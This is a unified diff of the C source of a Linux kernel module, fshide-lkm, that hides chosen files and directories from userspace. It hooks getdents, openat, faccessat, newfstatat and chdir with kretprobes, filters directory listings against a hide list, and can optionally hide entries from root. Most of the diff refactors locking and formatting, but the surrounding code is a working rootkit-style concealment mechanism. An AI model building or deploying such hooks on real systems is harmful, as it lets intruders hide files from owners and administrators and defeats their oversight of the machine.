@@ -1,4 +1,3 @@
-#define SYSCALL_REGS(kregs) ((struct pt_regs *)(kregs)->regs[0])
 #include <linux/kernel.h>
 #include <linux/module.h>
 #include <linux/kprobes.h>
@@ -15,42 +14,45 @@
 #include <linux/mm.h>
 #include <linux/uidgid.h>
 #include <linux/miscdevice.h>
+#include <linux/spinlock.h>
 #include <asm/current.h>
 
 MODULE_LICENSE("GPL v2");
 MODULE_DESCRIPTION("Hide specified files and directories from userspace (LKM)");
 MODULE_AUTHOR("fshide-lkm");
 
+#define SYSCALL_REGS(kregs) ((struct pt_regs *)(kregs)->regs[0])
+
 #ifdef FSHIDE_DEBUG
-#define LOG_TAG            "[fshide]"
-#define DBG(fmt, ...)      pr_info(LOG_TAG" [DBG] " fmt "\n", ##__VA_ARGS__)
+#define LOG_TAG "[fshide]"
+#define DBG(fmt, ...) pr_info(LOG_TAG" [DBG] " fmt "\n", ##__VA_ARGS__)
 #else
-#define DBG(fmt, ...)      ((void)0)
+#define DBG(fmt, ...) ((void)0)
 #endif
 
-#define MAX_HIDE_ENTRIES   128
-#define MAX_PATH_LEN       512
-#define MAX_UID_DIGITS     10
-#define DIRENT64_BUF_SIZE  4096
+#define MAX_HIDE_ENTRIES 128
+#define MAX_PATH_LEN 512
+#define MAX_UID_DIGITS 10
+#define DIRENT64_BUF_SIZE 4096
 
 struct linux_dirent64 {
-	uint64_t        d_ino;
-	int64_t         d_off;
-	unsigned short  d_reclen;
-	unsigned char   d_type;
-	char            d_name[];
+	uint64_t d_ino;
+	int64_t d_off;
+	unsigned short d_reclen;
+	unsigned char d_type;
+	char d_name[];
 };
 
 struct hide_entry {
-	char   path[MAX_PATH_LEN];
-	uid_t  uid;
+	char path[MAX_PATH_LEN];
+	uid_t uid;
 	uint8_t active;
 	uint8_t has_uid;
 };
 
 static struct hide_entry hide_list[MAX_HIDE_ENTRIES];
 static int hide_count;
-static DEFINE_MUTEX(hide_lock);
+static DEFINE_SPINLOCK(hide_lock);
 static int hide_from_root;
 static int misc_registered;
 
@@ -101,6 +103,7 @@ static void parse_config_line(const char *line)
 	const char *p = line, *path_end, *uid_part;
 	char path_buf[MAX_PATH_LEN];
 	int plen;
+	unsigned long flags;
 
 	while (*p == ' ' || *p == '\t') p++;
 	if (!*p || *p == '#' || *p == '\n' || *p == '\r') return;
@@ -116,7 +119,7 @@ static void parse_config_line(const char *line)
 	uid_part = path_end;
 	while (*uid_part == ' ' || *uid_part == '\t') uid_part++;
 
-	mutex_lock(&hide_lock);
+	spin_lock_irqsave(&hide_lock, flags);
 	if (!strncasecmp(uid_part, "uid:", 4)) {
 		const char *up = uid_part + 4;
 		while (*up) {
@@ -130,32 +133,35 @@ static void parse_config_line(const char *line)
 	} else {
 		add_path_with_uid_locked(path_buf, 0, 0);
 	}
-	mutex_unlock(&hide_lock);
+	spin_unlock_irqrestore(&hide_lock, flags);
 }
 
 static void clear_all_entries(void)
 {
-	mutex_lock(&hide_lock);
+	unsigned long flags;
+	spin_lock_irqsave(&hide_lock, flags);
 	memset(hide_list, 0, sizeof(hide_list));
 	hide_count = 0;
-	mutex_unlock(&hide_lock);
+	spin_unlock_irqrestore(&hide_lock, flags);
 }
 
 static int match_hide_path(const char *path, uid_t uid)
 {
-	int i;
+	int i, ret = -1;
+	unsigned long flags;
+
 	if (!path || !*path || path[0] != '/') return -1;
 	if (!hide_from_root && uid == 0) return -1;
-	mutex_lock(&hide_lock);
+	spin_lock_irqsave(&hide_lock, flags);
 	for (i = 0; i < hide_count; i++) {
 		if (!hide_list[i].active) continue;
 		if (strcmp(hide_list[i].path, path) != 0) continue;
 		if (hide_list[i].has_uid && hide_list[i].uid != uid) continue;
-		mutex_unlock(&hide_lock);
-		return i;
+		ret = i;
+		break;
 	}
-	mutex_unlock(&hide_lock);
-	return -1;
+	spin_unlock_irqrestore(&hide_lock, flags);
+	return ret;
 }
 
 static int resolve_fd_path(int fd, char *buf, int buflen)
@@ -166,11 +172,8 @@ static int resolve_fd_path(int fd, char *buf, int buflen)
 	file = fget(fd);
 	if (!file) return -EBADF;
 
-	page = (char *)__get_free_page(GFP_KERNEL);
-	if (!page) {
-		fput(file);
-		return -ENOMEM;
-	}
+	page = (char *)__get_free_page(GFP_ATOMIC);
+	if (!page) { fput(file); return -ENOMEM; }
 
 	path_ptr = d_path(&file->f_path, page, PAGE_SIZE);
 	if (IS_ERR(path_ptr)) {
@@ -196,14 +199,11 @@ struct hook_data {
 static int getdents_entry_handler(struct kretprobe_instance *ri, struct pt_regs *regs)
 {
 	struct hook_data *data = (struct hook_data *)ri->data;
-	int fd;
-
 	data->has_path = 0;
 	data->buf = NULL;
-	fd = (int)SYSCALL_REGS(regs)->regs[0];
-	data->fd = fd;
+	data->fd = (int)SYSCALL_REGS(regs)->regs[0];
 	data->buf = (void __user *)SYSCALL_REGS(regs)->regs[1];
-	if (resolve_fd_path(fd, data->path, sizeof(data->path)) > 0)
+	if (resolve_fd_path(data->fd, data->path, sizeof(data->path)) > 0)
 		data->has_path = 1;
 	return 0;
 }
@@ -219,19 +219,13 @@ static int getdents_ret_handler(struct kretprobe_instance *ri, struct pt_regs *r
 	if (!data->has_path || total <= 0 || !data->buf) return 0;
 	if (total > DIRENT64_BUF_SIZE) total = DIRENT64_BUF_SIZE;
 
-	kbuf = kmalloc(DIRENT64_BUF_SIZE, GFP_KERNEL);
+	kbuf = kmalloc(DIRENT64_BUF_SIZE, GFP_ATOMIC);
 	if (!kbuf) return 0;
 
-	if (copy_from_user(kbuf, data->buf, total)) {
-		kfree(kbuf);
-		return 0;
-	}
+	if (copy_from_user(kbuf, data->buf, total)) { kfree(kbuf); return 0; }
 
 	uid = from_kuid(&init_user_ns, current_uid());
-	if (!hide_from_root && uid == 0) {
-		kfree(kbuf);
-		return 0;
-	}
+	if (!hide_from_root && uid == 0) { kfree(kbuf); return 0; }
 
 	pos = 0;
 	new_total = 0;
@@ -269,7 +263,8 @@ static int openat_entry_handler(struct kretprobe_instance *ri, struct pt_regs *r
 {
 	struct hook_entry_data *data = (struct hook_entry_data *)ri->data;
 	long ret;
-	ret = strncpy_from_user(data->path, (const char __user *)SYSCALL_REGS(regs)->regs[1], sizeof(data->path) - 1);
+	ret = strncpy_from_user(data->path, (const char __user *)SYSCALL_REGS(regs)->regs[1],
+	                        sizeof(data->path) - 1);
 	if (ret > 0) data->path[ret] = '\0';
 	else data->path[0] = '\0';
 	return 0;
@@ -292,7 +287,8 @@ static int faccessat_entry_handler(struct kretprobe_instance *ri, struct pt_regs
 {
 	struct hook_entry_data *data = (struct hook_entry_data *)ri->data;
 	long ret;
-	ret = strncpy_from_user(data->path, (const char __user *)SYSCALL_REGS(regs)->regs[1], sizeof(data->path) - 1);
+	ret = strncpy_from_user(data->path, (const char __user *)SYSCALL_REGS(regs)->regs[1],
+	                        sizeof(data->path) - 1);
 	if (ret > 0) data->path[ret] = '\0';
 	else data->path[0] = '\0';
 	return 0;
@@ -315,7 +311,8 @@ static int newfstatat_entry_handler(struct kretprobe_instance *ri, struct pt_reg
 {
 	struct hook_entry_data *data = (struct hook_entry_data *)ri->data;
 	long ret;
-	ret = strncpy_from_user(data->path, (const char __user *)SYSCALL_REGS(regs)->regs[1], sizeof(data->path) - 1);
+	ret = strncpy_from_user(data->path, (const char __user *)SYSCALL_REGS(regs)->regs[1],
+	                        sizeof(data->path) - 1);
 	if (ret > 0) data->path[ret] = '\0';
 	else data->path[0] = '\0';
 	return 0;
@@ -338,7 +335,8 @@ static int chdir_entry_handler(struct kretprobe_instance *ri, struct pt_regs *re
 {
 	struct hook_entry_data *data = (struct hook_entry_data *)ri->data;
 	long ret;
-	ret = strncpy_from_user(data->path, (const char __user *)SYSCALL_REGS(regs)->regs[0], sizeof(data->path) - 1);
+	ret = strncpy_from_user(data->path, (const char __user *)SYSCALL_REGS(regs)->regs[0],
+	                        sizeof(data->path) - 1);
 	if (ret > 0) data->path[ret] = '\0';
 	else data->path[0] = '\0';
 	return 0;
@@ -443,7 +441,8 @@ static int register_all_hooks(void)
 	for (i = 0; i < KRPOOL_COUNT; i++) {
 		ret = register_kretprobe(all_krps[i]);
 		if (ret < 0) {
-			DBG("register_kretprobe(%s) FAILED err=%d", all_krps[i]->kp.symbol_name, ret);
+			DBG("register_kretprobe(%s) FAILED err=%d",
+			    all_krps[i]->kp.symbol_name, ret);
 			goto fail;
 		}
 		DBG("registered kretprobe on %s", all_krps[i]->kp.symbol_name);
@@ -467,15 +466,14 @@ static ssize_t fshide_read(struct file *file, char __user *ubuf,
 {
 	char *buf;
 	int pos = 0, i, ret;
+	unsigned long flags;
 
 	buf = kmalloc(PAGE_SIZE, GFP_KERNEL);
 	if (!buf) return -ENOMEM;
 
+	spin_lock_irqsave(&hide_lock, flags);
 	pos += scnprintf(buf + pos, PAGE_SIZE - pos,
-	                 "entries=%d\nhide_root=%d\n",
-	                 hide_count, hide_from_root);
-
-	mutex_lock(&hide_lock);
+	                 "entries=%d\nhide_root=%d\n", hide_count, hide_from_root);
 	for (i = 0; i < hide_count && pos < PAGE_SIZE - 128; i++) {
 		if (hide_list[i].active)
 			pos += scnprintf(buf + pos, PAGE_SIZE - pos,
@@ -484,7 +482,7 @@ static ssize_t fshide_read(struct file *file, char __user *ubuf,
 			                 hide_list[i].uid,
 			                 hide_list[i].has_uid ? "" : " [global]");
 	}
-	mutex_unlock(&hide_lock);
+	spin_unlock_irqrestore(&hide_lock, flags);
 
 	if (*ppos >= pos) { kfree(buf); return 0; }
 	ret = min((size_t)(pos - *ppos), len);
@@ -498,7 +496,7 @@ static ssize_t fshide_write(struct file *file, const char __user *ubuf,
                             size_t len, loff_t *ppos)
 {
 	char *buf;
-	const char *p, *line_end;
+	const char *p;
 
 	if (len > PAGE_SIZE) len = PAGE_SIZE;
 	buf = kmalloc(len + 1, GFP_KERNEL);
@@ -510,6 +508,7 @@ static ssize_t fshide_write(struct file *file, const char __user *ubuf,
 	while (*p) {
 		char line[512];
 		int llen;
+		const char *line_end;
 		while (*p == '\n' || *p == '\r') { p++; continue; }
 		if (!*p) break;
 		line_end = p;
